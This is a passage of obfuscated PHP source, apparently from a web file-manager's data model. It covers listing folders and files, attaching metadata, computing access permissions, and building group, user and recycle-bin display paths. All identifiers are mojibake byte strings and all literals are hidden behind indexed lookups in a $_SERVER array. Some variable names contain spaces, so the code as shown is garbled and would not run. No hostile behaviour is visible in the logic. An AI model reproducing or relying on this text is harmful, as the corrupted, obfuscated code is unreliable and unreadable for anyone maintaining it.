_listFilterInfo(&$ë¼¬«ë, $½·õš¸ô = false) { $¥‹šÀ£ =& $_SERVER[³à¼î¯á]; foreach ($ë¼¬«ë as &$—±ÄøŠë) { $—±ÄøŠë = $this->pathInfoFilter($—±ÄøŠë); self::$cachePathInfo[$¥‹šÀ£[509] . intval($½·õš¸ô) . $¥‹šÀ£[437] . $—±ÄøŠë[$¥‹šÀ£[184]]] = $—±ÄøŠë; } unset($—±ÄøŠë); } protected function _listMake(&$à‹¦€Œ) { $×É“š¢ò =& $_SERVER[³à¼î¯á]; $à‹¦€Œ[$×É“š¢ò[85]] = array(); $à‹¦€Œ[$×É“š¢ò[86]] = array(); foreach ($à‹¦€Œ[$×É“š¢ò[420]] as $¾‘Í¿·à) { $ÛÍÈ’Å = $¾‘Í¿·à[$×É“š¢ò[460]] == 1 ? $×É“š¢ò[85] : $×É“š¢ò[86]; $à‹¦€Œ[$ÛÍÈ’Å][] = $¾‘Í¿·à; } unset($à‹¦€Œ[$×É“š¢ò[420]]); } protected function _listAppendMeta(&$¾º²æ¬, $ÚÀğÊô) { $³ˆºÍò =& $_SERVER[³à¼î¯á]; $ØÌÊ©È = array($³ˆºÍò[466] => array($³ˆºÍò[467], $ÚÀğÊô)); $÷¢ñ™Æ½ = Model($³ˆºÍò[510])->field($³ˆºÍò[511])->where($ØÌÊ©È)->select(); if (!$÷¢ñ™Æ½) { return; } $ÎÑŞìí = array($³ˆºÍò[512], $³ˆºÍò[513], $³ˆºÍò[492]); $¾È»Ÿô = array(); foreach ($÷¢ñ™Æ½ as $¬¡³ªİñ) { if (!isset($¾È»Ÿô[$¬¡³ªİñ[$³ˆºÍò[184]]])) { $¾È»Ÿô[$¬¡³ªİñ[$³ˆºÍò[184]]] = array(); } if (in_array($¬¡³ªİñ[$³ˆºÍò[97]], $ÎÑŞìí)) { continue; } $¾È»Ÿô[$¬¡³ªİñ[$³ˆºÍò[184]]][$¬¡³ªİñ[$³ˆºÍò[97]]] = $¬¡³ªİñ[$³ˆºÍò[425]]; } foreach ($¾º²æ¬ as &$ô¢÷ÀÕÈ) { $ô¢÷ÀÕÈ[$³ˆºÍò[514]] = !1; if (isset($¾È»Ÿô[$ô¢÷ÀÕÈ[$³ˆºÍò[184]]])) { $ô¢÷ÀÕÈ[$³ˆºÍò[514]] = $¾È»Ÿô[$ô¢÷ÀÕÈ[$³ˆºÍò[184]]]; } if ($this->fileIsLock($ô¢÷ÀÕÈ) && $ô¢÷ÀÕÈ[$³ˆºÍò[462]]) { $´°†Áì‘ = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $ô¢÷ÀÕÈ[$³ˆºÍò[462]][$³ˆºÍò[463]] = AuthModel::authDisable($ô¢÷ÀÕÈ[$³ˆºÍò[462]][$³ˆºÍò[463]], $´°†Áì‘); $ô¢÷ÀÕÈ[$³ˆºÍò[462]][$³ˆºÍò[515]][$³ˆºÍò[462]] = $ô¢÷ÀÕÈ[$³ˆºÍò[462]][$³ˆºÍò[463]]; } } unset($ô¢÷ÀÕÈ); } protected function _listAppendFileMeta(&$¨ƒ€Ïúç, $«¾ØÏ¾³) { $Ã´ÇıòÌ =& $_SERVER[³à¼î¯á]; $üîº¦èì = array_to_keyvalue($¨ƒ€Ïúç, $Ã´ÇıòÌ[12], $Ã´ÇıòÌ[516]); $üîº¦èì = array_filter(array_unique($üîº¦èì)); if (!$üîº¦èì) { return; } $© ãùÜ = array($Ã´ÇıòÌ[517] => array($Ã´ÇıòÌ[467], $üîº¦èì)); $Ö…ùµÖ = $Ã´ÇıòÌ[518]; $ÄÌÕêÈ = Model($Ã´ÇıòÌ[519])->field($Ö…ùµÖ)->where($© ãùÜ)->select(); $ÄÌÕêÈ = array_to_keyvalue($ÄÌÕêÈ, $Ã´ÇıòÌ[516]); $òöÖ¡ıø = Model($Ã´ÇıòÌ[520])->field($Ã´ÇıòÌ[521])->where($© ãùÜ)->select(); $òöÖ¡ıø = $òöÖ¡ıø ? $òöÖ¡ıø : array(); $É„­ƒ‚Ù = array(); foreach ($òöÖ¡ıø as $òì¡äò¼) { if (!isset($É„­ƒ‚Ù[$òì¡äò¼[$Ã´ÇıòÌ[516]]])) { $É„­ƒ‚Ù[$òì¡äò¼[$Ã´ÇıòÌ[516]]] = array(); } $É„­ƒ‚Ù[$òì¡äò¼[$Ã´ÇıòÌ[516]]][$òì¡äò¼[$Ã´ÇıòÌ[97]]] = $òì¡äò¼[$Ã´ÇıòÌ[425]]; } foreach ($¨ƒ€Ïúç as &$À©ÆóÉâ) { $ğàä†¶Ì = $À©ÆóÉâ[$Ã´ÇıòÌ[516]]; if (!$ğàä†¶Ì || !is_array($ÄÌÕêÈ[$ğàä†¶Ì])) { continue; } $ÃìÍ²š = $ÄÌÕêÈ[$ğàä†¶Ì]; $ÃìÍ²š[$Ã´ÇıòÌ[79]] = $À©ÆóÉâ[$Ã´ÇıòÌ[79]]; $ÃìÍ²š[$Ã´ÇıòÌ[32]] = $À©ÆóÉâ[$Ã´ÇıòÌ[32]]; if (!$ÃìÍ²š[$Ã´ÇıòÌ[522]]) { Model($Ã´ÇıòÌ[519])->fileMd5Check($ÃìÍ²š); } if (!isset(self::$cacheFileInfo[$Ã´ÇıòÌ[523] . $ğàä†¶Ì])) { self::$cacheFileInfo[$Ã´ÇıòÌ[523] . $ğàä†¶Ì] = array_merge(array(), $ÃìÍ²š); } unset($ÄÌÕêÈ[$ğàä†¶Ì][$Ã´ÇıòÌ[87]]); $óÛùÀ‘¿ = is_array($É„­ƒ‚Ù[$ğàä†¶Ì]) ? $É„­ƒ‚Ù[$ğàä†¶Ì] : array(); $À©ÆóÉâ[$Ã´ÇıòÌ[524]] = array_merge($óÛùÀ‘¿, $ÄÌÕêÈ[$ğàä†¶Ì]); if (isset($À©ÆóÉâ[$Ã´ÇıòÌ[524]][$Ã´ÇıòÌ[174]])) { $À©ÆóÉâ[$Ã´ÇıòÌ[174]] = json_decode($À©ÆóÉâ[$Ã´ÇıòÌ[524]][$Ã´ÇıòÌ[174]], !0); unset($À©ÆóÉâ[$Ã´ÇıòÌ[524]][$Ã´ÇıòÌ[174]]); } } unset($À©ÆóÉâ); } protected function _listAppendSourceInfo(&$ƒ­¤ñÜı, $œÚ¨áÑ¦) { $åé‚­âÀ =& $_SERVER[³à¼î¯á]; $Õ¢¤·‹ = Model($åé‚­âÀ[525])->listData(); $¶Ë§—¹¸ = Model($åé‚­âÀ[474])->listData(); $×®¿¶Ÿ = Model($åé‚­âÀ[464])->listData(); $¹¥îä£¶ = Model($åé‚­âÀ[526])->listSimple(); $Á„¼¹µà = array_to_keyvalue($Õ¢¤·‹, $åé‚­âÀ[450]); $ó†ãóåÛ = array_to_keyvalue_group($¶Ë§—¹¸, $åé‚­âÀ[87], $åé‚­âÀ[475]); $¨š·ÛĞí = array_to_keyvalue($×®¿¶Ÿ, $åé‚­âÀ[87]); $º×º½û‚ = array_to_keyvalue_group($¹¥îä£¶, $åé‚­âÀ[184]); foreach ($ƒ­¤ñÜı as &$±ìê€‘) { $±ìê€‘[$åé‚­âÀ[90]] = array($åé‚­âÀ[527] => 0, $åé‚­âÀ[528] => 0, $åé‚­âÀ[529] => 0); if (isset($¨š·ÛĞí[$±ìê€‘[$åé‚­âÀ[184]]])) { $±ìê€‘[$åé‚­âÀ[90]][$åé‚­âÀ[530]] = 1; $±ìê€‘[$åé‚­âÀ[90]][$åé‚­âÀ[531]] = $¨š·ÛĞí[$±ìê€‘[$åé‚­âÀ[184]]][$åé‚­âÀ[32]]; } if ($ó†ãóåÛ && $Á„¼¹µà && isset($ó†ãóåÛ[$±ìê€‘[$åé‚­âÀ[184]]])) { $±ìê€‘[$åé‚­âÀ[90]][$åé‚­âÀ[532]] = array(); foreach ($ó†ãóåÛ[$±ìê€‘[$åé‚­âÀ[184]]] as $Ô¢è€¥¢) { $’Ó¾è´¾ = $Á„¼¹µà[$Ô¢è€¥¢]; $±ìê€‘[$åé‚­âÀ[90]][$åé‚­âÀ[532]][] = array($åé‚­âÀ[533] => $’Ó¾è´¾[$åé‚­âÀ[450]], $åé‚­âÀ[469] => $’Ó¾è´¾[$åé‚­âÀ[32]], $åé‚­âÀ[534] => $’Ó¾è´¾[$åé‚­âÀ[535]]); } } if ($º×º½û‚ && isset($º×º½û‚[$±ìê€‘[$åé‚­âÀ[184]]])) { $±ìê€‘[$åé‚­âÀ[90]][$åé‚­âÀ[536]] = array(); foreach ($º×º½û‚[$±ìê€‘[$åé‚­âÀ[184]]] as $‡¾‹„š½) { $ñıã®Ğ = $åé‚­âÀ[537]; if ($‡¾‹„š½[$åé‚­âÀ[538]] == $åé‚­âÀ[91]) { $ñıã®Ğ .= $åé‚­âÀ[539]; } $±ìê€‘[$åé‚­âÀ[90]][$åé‚­âÀ[536]] = array_field_key($‡¾‹„š½, explode($åé‚­âÀ[50], $ñıã®Ğ)); } } } unset($±ìê€‘); return $ƒ­¤ñÜı; } protected function _listAppendChildren(&$Æ·§Ô­¡, $£‹õØÅÇ) { $÷ÕİĞ°À =& $_SERVER[³à¼î¯á]; $¬ÍÃË = array(); $íĞÎêó = array($÷ÕİĞ°À[230] => 0, $÷ÕİĞ°À[231] => 0); foreach ($Æ·§Ô­¡ as &$É­ä’ª) { if (!$É­ä’ª[$÷ÕİĞ°À[460]]) { continue; } $¬ÍÃË[] = $É­ä’ª[$÷ÕİĞ°À[184]]; } unset($É­ä’ª); if (!$¬ÍÃË) { return; } $™©¼ª“° = array($÷ÕİĞ°À[183] => array($÷ÕİĞ°À[7], $¬ÍÃË), $÷ÕİĞ°À[480] => 0); $ÎÍÜíÖ = array($÷ÕİĞ°À[183], $÷ÕİĞ°À[460], $÷ÕİĞ°À[540] => $÷ÕİĞ°À[541]); $Ê¢—œ°« = $this->field($ÎÍÜíÖ)->where($™©¼ª“°)->group($÷ÕİĞ°À[542])->select(); $Ö”¦ƒúİ = array(); foreach ($Ê¢—œ°« as $©³Õ„øñ) { $šóÑÃ–õ = $©³Õ„øñ[$÷ÕİĞ°À[183]]; $İÑë™ú¨ = $©³Õ„øñ[$÷ÕİĞ°À[460]] == $÷ÕİĞ°À[91] ? $÷ÕİĞ°À[231] : $÷ÕİĞ°À[230]; if (!isset($Ö”¦ƒúİ[$šóÑÃ–õ])) { $Ö”¦ƒúİ[$šóÑÃ–õ] = array($÷ÕİĞ°À[230] => 0, $÷ÕİĞ°À[231] => 0); } $Ö”¦ƒúİ[$šóÑÃ–õ][$İÑë™ú¨] += $©³Õ„øñ[$÷ÕİĞ°À[541]]; } foreach ($Æ·§Ô­¡ as &$É­ä’ª) { if (!$É­ä’ª[$÷ÕİĞ°À[460]]) { continue; } $²ºô¥Š = is_array($Ö”¦ƒúİ[$É­ä’ª[$÷ÕİĞ°À[184]]]) ? $Ö”¦ƒúİ[$É­ä’ª[$÷ÕİĞ°À[184]]] : $íĞÎêó; $É­ä’ª[$÷ÕİĞ°À[231]] = $²ºô¥Š[$÷ÕİĞ°À[231]]; $É­ä’ª[$÷ÕİĞ°À[230]] = $²ºô¥Š[$÷ÕİĞ°À[230]]; unset($É­ä’ª[$÷ÕİĞ°À[461]]); } unset($É­ä’ª); } protected function _listAppendAuth(&$ÙøëÇ) { $ş×¶ÖÃ™ =& $_SERVER[³à¼î¯á]; $Ğ„‚¸Í¯ = array(); foreach ($ÙøëÇ as $ôÍÙ›) { if ($ôÍÙ›[$ş×¶ÖÃ™[181]] == self::TYPE_GROUP) { $Ğ„‚¸Í¯[] = $ôÍÙ›[$ş×¶ÖÃ™[184]]; } } if (!$Ğ„‚¸Í¯) { return; } $”¨ÒÑ©¢ = array_to_keyvalue($ÙøëÇ, $ş×¶ÖÃ™[184]); $ÜáÉª¼» = Model($ş×¶ÖÃ™[543])->getSourceList($Ğ„‚¸Í¯, $”¨ÒÑ©¢); $ªĞÌîÎ– = KodUser::isRoot(); foreach ($ÙøëÇ as $½Òœóª‹ => &$ôÍÙ›) { $ôÍÙ›[$ş×¶ÖÃ™[462]] = $ÜáÉª¼»[$ôÍÙ›[$ş×¶ÖÃ™[184]]]; if (!$ôÍÙ›[$ş×¶ÖÃ™[462]] && $ôÍÙ›[$ş×¶ÖÃ™[181]] == self::TYPE_GROUP) { $ôÍÙ›[$ş×¶ÖÃ™[462]] = Action($ş×¶ÖÃ™[544])->pathGroupAuthMake($ôÍÙ›[$ş×¶ÖÃ™[545]]); if (!$ôÍÙ›[$ş×¶ÖÃ™[462]] && !$ªĞÌîÎ–) { $ôÍÙ›[$ş×¶ÖÃ™[224]] = !1; $ôÍÙ›[$ş×¶ÖÃ™[223]] = !1; } } if ($ôÍÙ›[$ş×¶ÖÃ™[462]]) { $ôÍÙ›[$ş×¶ÖÃ™[224]] = AuthModel::authCheckEdit($ôÍÙ›[$ş×¶ÖÃ™[462]][$ş×¶ÖÃ™[463]]); $ôÍÙ›[$ş×¶ÖÃ™[223]] = AuthModel::authCheckView($ôÍÙ›[$ş×¶ÖÃ™[462]][$ş×¶ÖÃ™[463]]); } $this->groupPathDisplay($ôÍÙ›); } unset($ôÍÙ›); } public function _listAppendAuthSecret(&$¸˜¦¬õû) { $âîÏ–¦÷ =& $_SERVER[³à¼î¯á]; if (Model($âîÏ–¦÷[483])->get($âîÏ–¦÷[546]) != $âîÏ–¦÷[91]) { return; } static $šÆû·ı = false; if (!$šÆû·ı) { $İ–ç¬‚’ = Model($âîÏ–¦÷[547]); $İ¯ìÂ€ñ = Model($âîÏ–¦÷[548]); $šÆû·ı = $İ¯ìÂ€ñ->listData(); $šÆû·ı = array_to_keyvalue($šÆû·ı, $âîÏ–¦÷[184]); $²Ì¾“â‡ = json_decode(Model($âîÏ–¦÷[483])->get($âîÏ–¦÷[549]), !0); $²Ì¾“â‡ = array_to_keyvalue($²Ì¾“â‡, $âîÏ–¦÷[450]); foreach ($šÆû·ı as $ÀÛÔÅ²ä => $Å¾™ƒÒÂ) { $ÔªÄŞ = $²Ì¾“â‡[$Å¾™ƒÒÂ[$âîÏ–¦÷[550]]]; if (!$ÔªÄŞ) { $İ¯ìÂ€ñ->remove($Å¾™ƒÒÂ[$âîÏ–¦÷[450]]); unset($šÆû·ı[$ÀÛÔÅ²ä]); continue; } $Äº»‡÷ƒ = $İ–ç¬‚’->listData($ÔªÄŞ[$âîÏ–¦÷[462]]); if (!$Äº»‡÷ƒ) { $İ¯ìÂ€ñ->remove($Å¾™ƒÒÂ[$âîÏ–¦÷[450]]); unset($šÆû·ı[$ÀÛÔÅ²ä]); continue; } $Å¾™ƒÒÂ[$âîÏ–¦÷[462]] = $Äº»‡÷ƒ; $Å¾™ƒÒÂ[$âîÏ–¦÷[551]] = $ÔªÄŞ; $Å¾™ƒÒÂ[$âîÏ–¦÷[552]] = Model($âîÏ–¦÷[553])->getInfoSimpleOuter($Å¾™ƒÒÂ[$âîÏ–¦÷[502]]); $šÆû·ı[$ÀÛÔÅ²ä] = $Å¾™ƒÒÂ; } } $÷¬ù—ÇÍ = USER_ID; $˜òïå“ = array(); $®¬Â“ªà = $this->_listAppendPath($˜òïå“, !0); foreach ($¸˜¦¬õû as $ÀÛÔÅ²ä => &$Å¾™ƒÒÂ) { if (!is_array($Å¾™ƒÒÂ[$âîÏ–¦÷[462]])) { continue; } if ($Å¾™ƒÒÂ[$âîÏ–¦÷[181]] != $âîÏ–¦÷[554]) { continue; } if (isset($šÆû·ı[$Å¾™ƒÒÂ[$âîÏ–¦÷[184]]])) { $Æò Î … = $šÆû·ı[$Å¾™ƒÒÂ[$âîÏ–¦÷[184]]]; if (!is_array($Å¾™ƒÒÂ[$âîÏ–¦÷[514]])) { $Å¾™ƒÒÂ[$âîÏ–¦÷[514]] = array(); } $Å¾™ƒÒÂ[$âîÏ–¦÷[514]][$âîÏ–¦÷[555]] = $Æò Î …[$âîÏ–¦÷[550]]; $Å¾™ƒÒÂ[$âîÏ–¦÷[462]][$âîÏ–¦÷[556]] = $Æò Î …; $Å¾™ƒÒÂ[$âîÏ–¦÷[462]][$âîÏ–¦÷[557]] = $Å¾™ƒÒÂ[$âîÏ–¦÷[558]]; $Å¾™ƒÒÂ[$âîÏ–¦÷[462]][$âîÏ–¦÷[559]] = $âîÏ–¦÷[91]; if ($Æò Î …[$âîÏ–¦÷[502]] != $÷¬ù—ÇÍ) { $Å¾™ƒÒÂ[$âîÏ–¦÷[462]][$âîÏ–¦÷[463]] = $Å¾™ƒÒÂ[$âîÏ–¦÷[462]][$âîÏ–¦÷[463]] & $Æò Î …[$âîÏ–¦÷[462]][$âîÏ–¦÷[462]]; } continue; } $²»ùµæ = $this->parentLevelArray($Å¾™ƒÒÂ[$âîÏ–¦÷[560]]); $¼ŞŒ‘ÉŠ = array_reverse($²»ùµæ); foreach ($¼ŞŒ‘ÉŠ as $­¨§ûØĞ => $À—µÈìĞ) { if (!isset($šÆû·ı[$À—µÈìĞ])) { continue; } $Æò Î … = $šÆû·ı[$À—µÈìĞ]; $Å¾™ƒÒÂ[$âîÏ–¦÷[462]][$âîÏ–¦÷[556]] = $Æò Î …; if ($Æò Î …[$âîÏ–¦÷[502]] != $÷¬ù—ÇÍ) { $Å¾™ƒÒÂ[$âîÏ–¦÷[462]][$âîÏ–¦÷[463]] = $Å¾™ƒÒÂ[$âîÏ–¦÷[462]][$âîÏ–¦÷[463]] & $Æò Î …[$âîÏ–¦÷[462]][$âîÏ–¦÷[462]]; } $¼Â…Ù‚ = $âîÏ–¦÷[12]; $«£àùƒÌ = count($²»ùµæ) - $­¨§ûØĞ; for ($¼¤¼•º = 0; $¼¤¼•º < $«£àùƒÌ; $¼¤¼•º++) { if (!isset($®¬Â“ªà[$²»ùµæ[$¼¤¼•º]])) { $¼Â…Ù‚ = $âîÏ–¦÷[12]; break; } $¼Â…Ù‚ = $¼Â…Ù‚ . rtrim($®¬Â“ªà[$²»ùµæ[$¼¤¼•º]], $âîÏ–¦÷[8]) . $âîÏ–¦÷[8]; } $Å¾™ƒÒÂ[$âîÏ–¦÷[462]][$âîÏ–¦÷[557]] = rtrim($¼Â…Ù‚, $âîÏ–¦÷[8]) . $âîÏ–¦÷[8]; break; } } unset($Å¾™ƒÒÂ); } public function groupPathDisplay(&$ÍÄıû…À) { $âİÎèïë =& $_SERVER[³à¼î¯á]; if ($ÍÄıû…À[$âİÎèïë[181]] != self::TYPE_GROUP) { return; } $ÛĞ¨‰ç = Model($âİÎèïë[561])->getInfo($ÍÄıû…À[$âİÎèïë[545]]); $ÕƒòõãË = $this->parentLevelArray($ÛĞ¨‰ç[$âİÎèïë[560]]); $©¾¨É®‘ = $âİÎèïë[12]; foreach ($ÕƒòõãË as $¨óş¿˜é) { $ª¶ºöÑı = Model($âİÎèïë[561])->getInfo($¨óş¿˜é); $©¾¨É®‘ .= $ª¶ºöÑı[$âİÎèïë[90]][$âİÎèïë[184]] . $âİÎèïë[50]; } $ÍÄıû…À[$âİÎèïë[562]] = $ÛĞ¨‰ç[$âİÎèïë[183]]; $ÍÄıû…À[$âİÎèïë[563]] = $ÛĞ¨‰ç[$âİÎèïë[560]]; $ÍÄıû…À[$âİÎèïë[564]] = $ÛĞ¨‰ç[$âİÎèïë[565]]; $ÍÄıû…À[$âİÎèïë[566]] = $©¾¨É®‘ . $ÛĞ¨‰ç[$âİÎèïë[90]][$âİÎèïë[184]]; } protected function _listAppendPath(&$»Øü™¤, $¹åÚÉõò = false) { $şµãû”Ñ =& $_SERVER[³à¼î¯á]; static $–¨›°½à = array(); $‘ù¢‰ = array(); $Â·ª»ú = array(); if ($¹åÚÉõò) { return $–¨›°½à; } foreach ($»Øü™¤ as &$çµÈ€å†) { $ÖŒÍÆ»› = $çµÈ€å†[$şµãû”Ñ[184]]; if ($çµÈ€å†[$şµãû”Ñ[460]] == $şµãû”Ñ[91] && $çµÈ€å†[$şµãû”Ñ[183]] != 0) { $–¨›°½à[$ÖŒÍÆ»›] = $çµÈ€å†[$şµãû”Ñ[32]]; } if ($çµÈ€å†[$şµãû”Ñ[460]] == $şµãû”Ñ[91] && $çµÈ€å†[$şµãû”Ñ[183]] == 0) { $–¨›°½à[$ÖŒÍÆ»›] = $this->_listAppendPathRoot($çµÈ€å†, array()); } if (isset($Â·ª»ú[$çµÈ€å†[$şµãû”Ñ[560]]])) { continue; } $Â·ª»ú[$çµÈ€å†[$şµãû”Ñ[560]]] = !0; $æÏÒšÃ = $this->parentLevelArray($çµÈ€å†[$şµãû”Ñ[560]]); foreach ($æÏÒšÃ as $Ó¹Êº–Œ => $½£ÎÇù·) { if (isset($–¨›°½à[$½£ÎÇù·])) { continue; } if ($Ó¹Êº–Œ == 0) { $–¨›°½à[$½£ÎÇù·] = $this->_listAppendPathRoot($çµÈ€å†, $æÏÒšÃ); } if ($Ó¹Êº–Œ != 0) { $‘ù¢‰[] = $½£ÎÇù·; } } } unset($çµÈ€å†); $‘ù¢‰ = array_unique($‘ù¢‰); if (count($‘ù¢‰) > 0) { $¯¹š£‡¾ = array($şµãû”Ñ[466] => array($şµãû”Ñ[467], $‘ù¢‰)); if (count($‘ù¢‰) == 1) { $¬€€Àû® = $this->sourceInfo($‘ù¢‰[0]); $Êş¹¸Ù“ = is_array($¬€€Àû®) ? array($¬€€Àû®) : !1; } else { $Êş¹¸Ù“ = $this->field($şµãû”Ñ[567])->where($¯¹š£‡¾)->select(); } if (!$Êş¹¸Ù“) { $Êş¹¸Ù“ = array(); } foreach ($Êş¹¸Ù“ as $õ­×úˆ) { $–¨›°½à[$õ­×úˆ[$şµãû”Ñ[184]]] = $õ­×úˆ[$şµãû”Ñ[32]]; } } $¿İ°Ÿñİ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $”£½™äª = array(); foreach ($»Øü™¤ as &$çµÈ€å†) { $‚¬åˆ±® = $çµÈ€å†[$şµãû”Ñ[560]]; $ŒëüìŒ = $şµãû”Ñ[12]; if (isset($”£½™äª[$‚¬åˆ±®])) { $ŒëüìŒ = $”£½™äª[$‚¬åˆ±®]; } else { $æÏÒšÃ = $this->parentLevelArray($çµÈ€å†[$şµãû”Ñ[560]]); foreach ($æÏÒšÃ as $Ó¹Êº–Œ => $½£ÎÇù·) { if (isset($–¨›°½à[$½£ÎÇù·])) { $ŒëüìŒ .= $–¨›°½à[$½£ÎÇù·] . $şµãû”Ñ[8]; } } $”£½™äª[$‚¬åˆ±®] = $ŒëüìŒ; } $ŒëüìŒ .= $çµÈ€å†[$şµãû”Ñ[32]]; if ($çµÈ€å†[$şµãû”Ñ[460]] == $şµãû”Ñ[91]) { $ŒëüìŒ .= $şµãû”Ñ[8]; } $çµÈ€å†[$şµãû”Ñ[558]] = str_replace($şµãû”Ñ[568], $şµãû”Ñ[8], $ŒëüìŒ); if ($çµÈ€å†[$şµãû”Ñ[183]] == $şµãû”Ñ[219]) { $çµÈ€å†[$şµãû”Ñ[32]] = trim($–¨›°½à[$çµÈ€å†[$şµãû”Ñ[184]]], $şµãû”Ñ[8]); $çµÈ€å†[$şµãû”Ñ[558]] = $çµÈ€å†[$şµãû”Ñ[32]] . $şµãû”Ñ[8]; } if (intval($çµÈ€å†[$şµãû”Ñ[181]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($çµÈ€å†, $æÏÒšÃ, $¿İ°Ÿñİ); } } unset($çµÈ€å†); return $»Øü™¤; } private function _listAppendPathRecycle(&$ÁŸª®óó, $àĞİÈüƒ, $÷ï‘·½Ì) { $ÉÓñ® =& $_SERVER[³à¼î¯á]; if (!in_array($÷ï‘·½Ì, $àĞİÈüƒ) && $ÁŸª®óó[$ÉÓñ®[184]] != $÷ï‘·½Ì) { return; } $¸¨‚¢æ® = explode($ÉÓñ®[8], trim($ÁŸª®óó[$ÉÓñ®[558]], $ÉÓñ®[8])); $ÀÌ‚û€Ğ = implode($ÉÓñ®[8], array_slice($¸¨‚¢æ®, 2)); $ÁŸª®óó[$ÉÓñ®[558]] = $ÉÓñ®[8] . LNG($ÉÓñ®[569]) . $ÉÓñ®[8] . ltrim($ÀÌ‚û€Ğ, $ÉÓñ®[8]); $ÁŸª®óó[$ÉÓñ®[560]] = $ÉÓñ®[570] . implode($ÉÓñ®[50], array_slice($àĞİÈüƒ, 1)) . $ÉÓñ®[50]; if ($ÁŸª®óó[$ÉÓñ®[184]] == $÷ï‘·½Ì) { $ÁŸª®óó[$ÉÓñ®[560]] = $ÉÓñ®[570]; $ÁŸª®óó[$ÉÓñ®[183]] = $ÉÓñ®[219]; $ÁŸª®óó[$ÉÓñ®[32]] = LNG($ÉÓñ®[569]); } $ÁŸª®óó[$ÉÓñ®[571]] = $ÉÓñ®[572]; } protected function _listAppendPathRoot(&$á˜ıÕ±‡, $ŞÂ±û) { $Û¬û²Èˆ =& $_SERVER[³à¼î¯á]; static $¬•æº“» = false; $±ƒ ±ĞÁ = $Û¬û²Èˆ[12]; if ($á˜ıÕ±‡[$Û¬û²Èˆ[181]] == self::TYPE_USER) { if ($á˜ıÕ±‡[$Û¬û²Èˆ[545]] == USER_ID) { $±ƒ ±ĞÁ = LNG($Û¬û²Èˆ[573]); if ($¬•æº“» === !1) { $˜Û­€½Ã = Model($Û¬û²Èˆ[574])->getInfoFull(USER_ID); $¬•æº“» = _get($˜Û­€½Ã, $Û¬û²Èˆ[575], $Û¬û²Èˆ[12]); } if ($ŞÂ±û && $ŞÂ±û[0] == $¬•æº“» || !$ŞÂ±û && $á˜ıÕ±‡[$Û¬û²Èˆ[184]] == $¬•æº“») { $±ƒ ±ĞÁ = LNG($Û¬û²Èˆ[576]); $á˜ıÕ±‡[$Û¬û²Èˆ[577]] = $Û¬û²Èˆ[578]; } if (!$ŞÂ±û) { $á˜ıÕ±‡[$Û¬û²Èˆ[32]] = $±ƒ ±ĞÁ; } } else { $á˜ıÕ±‡[$Û¬û²Èˆ[579]] = Model($Û¬û²Èˆ[553])->getInfoSimpleOuter($á˜ıÕ±‡[$Û¬û²Èˆ[545]]); $±ƒ ±ĞÁ = LNG($Û¬û²Èˆ[580]) . $Û¬û²Èˆ[166] . $á˜ıÕ±‡[$Û¬û²Èˆ[579]][$Û¬û²Èˆ[32]] . $Û¬û²Èˆ[168]; } } else { if ($á˜ıÕ±‡[$Û¬û²Èˆ[181]] == self::TYPE_GROUP) { $¾ÎÖûàë = Model($Û¬û²Èˆ[561])->getInfoSimple($á˜ıÕ±‡[$Û¬û²Èˆ[545]]); $±ƒ ±ĞÁ = $¾ÎÖûàë[$Û¬û²Èˆ[32]]; } else { if ($á˜ıÕ±‡[$Û¬û²Èˆ[181]] == self::TYPE_SYSTEM) { $±ƒ ±ĞÁ = $Û¬û²Èˆ[581]; } } } $±ƒ ±ĞÁ = $±ƒ ±ĞÁ ? $Û¬û²Èˆ[8] . $±ƒ ±ĞÁ . $Û¬û²Èˆ[8] : $Û¬û²Èˆ[8]; return $±ƒ ±ĞÁ; } protected function _listAppendUser(&$ËÈŸ³¤) { $¸ôÌˆ =& $_SERVER[³à¼î¯á]; $ìşÓ¦ş× = array_to_keyvalue($ËÈŸ³¤, $¸ôÌˆ[12], $¸ôÌˆ[502]); $·ğ²¤µï = array_to_keyvalue($ËÈŸ³¤, $¸ôÌˆ[12], $¸ôÌˆ[504]); $ûÃĞî³ø = array_merge($ìşÓ¦ş×, $·ğ²¤µï); $ßÓË®ş = Model($¸ôÌˆ[574])->userListInfo($ûÃĞî³ø); foreach ($ËÈŸ³¤ as &$š¿Â‡åİ) { $¡ŠâÓŒÈ = $š¿Â‡åİ[$¸ôÌˆ[502]]; $š¿Â‡åİ[$¸ôÌˆ[502]] = $ßÓË®ş[$¡ŠâÓŒÈ] ? $ßÓË®ş[$¡ŠâÓŒÈ] : !1; $¡ŠâÓŒÈ = $š¿Â‡åİ[$¸ôÌˆ[504]]; $š¿Â‡åİ[$¸ôÌˆ[504]] = $ßÓË®ş[$¡ŠâÓŒÈ] ? $ßÓË®ş[$¡ŠâÓŒÈ] : !1; if (isset($š¿Â‡åİ[$¸ôÌˆ[514]]) && $š¿Â‡åİ[$¸ôÌˆ[514]][$¸ôÌˆ[582]]) { $Ì¸úÃ¨ = $GLOBALS[$¸ôÌˆ[6]][$¸ôÌˆ[92]][$¸ôÌˆ[583]]; if ($š¿Â‡åİ[$¸ôÌˆ[514]][$¸ôÌˆ[584]] <= time() - $Ì¸úÃ¨) { $this->metaSet($š¿Â‡åİ[$¸ôÌˆ[184]], $¸ôÌˆ[582], null); $this->metaSet($š¿Â‡åİ[$¸ôÌˆ[184]], $¸ôÌˆ[584], null); unset($š¿Â‡åİ[$¸ôÌˆ[514]][$¸ôÌˆ[582]]); continue; } $ÊÉÒşñ¢ = $š¿Â‡åİ[$¸ôÌˆ[514]][$¸ôÌˆ[582]]; $š¿Â‡åİ[$¸ôÌˆ[514]][$¸ôÌˆ[585]] = Model($¸ôÌˆ[574])->getInfoSimpleOuter($ÊÉÒşñ¢); } } unset($š¿Â‡åİ); } public function parentLevelArray($š²ìèã) { $ÂâÅÔ­š =& $_SERVER[³à¼î¯á]; $š²ìèã = explode($ÂâÅÔ­š[50], trim($š²ìèã, $ÂâÅÔ­š[50])); return array_remove_value($š²ìèã, $ÂâÅÔ­š[219]); } public function listAll($Ú’ŸÀí) { $§î•±ÍÀ =& $_SERVER[³à¼î¯á]; $–Ü÷Õ” = $this->sourceInfo($Ú’ŸÀí); $†ŞÜ¯¡ = array($§î•±ÍÀ[586] => array($§î•±ÍÀ[587], $–Ü÷Õ”[$§î•±ÍÀ[560]] . $Ú’ŸÀí . $§î•±ÍÀ[588]), $§î•±ÍÀ[589] => 0); $ç´ÃÔà = $§î•±ÍÀ[590]; $¶¸€£«· = 